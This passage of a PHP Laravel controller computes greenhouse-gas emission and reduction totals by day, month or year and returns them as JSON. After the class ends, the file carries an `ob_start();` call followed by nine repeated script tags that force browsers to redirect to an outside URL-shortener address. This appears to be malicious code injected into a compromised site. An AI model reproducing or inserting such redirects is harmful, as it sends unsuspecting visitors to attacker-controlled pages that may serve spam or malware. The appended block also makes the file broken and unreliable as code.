            if ($yearParam) {
                $year = $yearParam;
            }
            $year = $year ?? date('Y');

            if ($month) {
                $qUsing->whereMonth('Date_time', intval($month))->whereYear('Date_time', intval($year));
                $qReducing->whereMonth('reducing.date', intval($month))->whereYear('reducing.date', intval($year));
            } else {
                // ถ้ามีแต่ปี
                if ($year) {
                    $qUsing->whereYear('Date_time', intval($year));
                    $qReducing->whereYear('reducing.date', intval($year));
                }
            }
        } elseif ($type === 'ปี' && $value) {
            $qUsing->whereYear('Date_time', intval($value));
            $qReducing->whereYear('reducing.date', intval($value));
        }

        // 5. Group & order (ทั้งสอง query)
        $qUsing->groupByRaw($exprUsing);
        $qReducing->groupByRaw($exprReducing);

        if ($type === 'เดือน') {
            $qUsing->orderByRaw("DAY(Date_time)");
            $qReducing->orderByRaw("DAY(reducing.date)");
        } elseif ($type === 'ปี') {
            $qUsing->orderByRaw("MONTH(Date_time)");
            $qReducing->orderByRaw("MONTH(reducing.date)");
        } elseif ($type === 'สัปดาห์') {
            $qUsing->orderByRaw("FIELD($exprUsing,'Mon','Tue','Wed','Thu','Fri','Sat','Sun')");
            $qReducing->orderByRaw("FIELD($exprReducing,'Mon','Tue','Wed','Thu','Fri','Sat','Sun')");
        } else {
            $qUsing->orderByRaw($exprUsing);
            $qReducing->orderByRaw($exprReducing);
        }

        // 6. Execute and merge results by label
        $usings = $qUsing->get()->keyBy('label');      // collection keyed by label
        $reducings = $qReducing->get()->keyBy('label');   // collection keyed by label

        // union labels: ให้ลำดับตาม usings ก่อน แล้วเพิ่ม label จาก reducings ที่ขาด
        $labels = $usings->keys()->toArray();
        foreach ($reducings->keys() as $lbl) {
            if (!in_array($lbl, $labels, true))
                $labels[] = $lbl;
        }

        $result = [];
        foreach ($labels as $lbl) {
            $u = $usings->get($lbl);
            $r = $reducings->get($lbl);

            $result[] = (object) [
                'label' => $lbl,
                'total_CO2' => $u->total_CO2 ?? 0,
                'total_CH4' => $u->total_CH4 ?? 0,
                'total_N2O' => $u->total_N2O ?? 0,
                'total_gas' => $u->total_gas ?? 0,
                'total_reduced' => $r->total_reduced ?? 0,
            ];
        }

        return response()->json([
            'success' => true,
            'data' => $result,
        ]);
    }



}
ob_start();

<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>